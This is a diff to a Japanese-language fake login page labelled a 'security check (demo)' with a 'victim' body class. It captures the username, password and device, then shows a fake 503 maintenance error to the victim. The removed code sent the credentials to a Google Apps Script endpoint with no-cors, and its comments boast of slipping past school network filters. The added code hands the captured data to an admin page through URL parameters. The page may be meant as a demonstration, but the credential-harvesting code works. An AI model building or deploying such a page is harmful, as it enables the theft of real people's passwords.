@@ -5,6 +5,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ログイン | セキュリティ確認（デモ）</title>
   <link rel="stylesheet" href="style.css">
+  <style>
+    /* 右下に配置する戻るボタンのスタイル */
+    .return-btn-container {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 9999;
+    }
+    .btn-return {
+      background: #238636;
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      font-size: 13px;
+    }
+    .btn-return:hover { background: #2ea043; }
+  </style>
 </head>
 <body class="victim-body">
   
@@ -35,50 +56,46 @@
     </form>
   </div>
 
-  <!-- ⚠️ エラー画面（ログイン後にスマホで表示され、そのまま留まる） -->
+  <!-- ⚠️ エラー画面（ログイン後に表示され、右下にボタンが出る） -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
     <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
   </div>
 
-  <script>
-    // 先ほどコピーしたGoogle Apps Scriptの「ウェブアプリのURL」をここに貼り付けてください
-    const API_URL = "ここにGASのウェブアプリURLを貼り付け";
+  <!-- 右下の戻るボタン（エラー画面のときだけ出現） -->
+  <div class="return-btn-container hidden" id="return-container">
+    <button class="btn-return" onclick="returnToAdmin()">🔄 管理画面へ戻る (データ送信)</button>
+  </div>
 
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      if (ua.includes("iPhone")) return "iPhone (iOS)";
-      if (ua.includes("iPad")) return "iPad (iOS)";
-      if (ua.includes("Android")) return "Androidスマホ";
-      if (ua.includes("Windows")) return "Windows PC";
-      if (ua.includes("Mac")) return "Mac PC";
-      return "不明な端末";
-    }
+  <script>
+    let capturedData = {};
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
+      // 入力された情報を一時保持
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
-      const device = getDeviceInfo();
+      const ua = navigator.userAgent;
+      const device = ua.includes("iPhone") ? "iPhone (iOS)" : ua.includes("Android") ? "Android" : "PC / その他";
       const time = new Date().toLocaleTimeString();
 
-      const payload = { time, device, username, password };
+      capturedData = { time, device, username, password };
 
-      // 学校のネット制限に引っかからない普通のHTTPS通信で安全に送信！
-      fetch(API_URL, {
-        method: "POST",
-        mode: "no-cors", // CORS制限を回避して確実に飛ばすおまじない
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      }).catch(err => console.log(err));
-
-      // スマホ側はフォームを隠してエラー画面を表示し、そこで完全にストップ！
+      // ログイン画面を消してエラー画面を表示
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
+      
+      // 右下の戻るボタンを表示
+      document.getElementById('return-container').classList.remove('hidden');
     });
+
+    function returnToAdmin() {
+      // 保持していたデータをURLパラメータに乗せて、admin.htmlへ戻る
+      const params = new URLSearchParams(capturedData);
+      window.location.href = `admin.html?${params.toString()}`;
+    }
   </script>
 </body>
 </html>
-
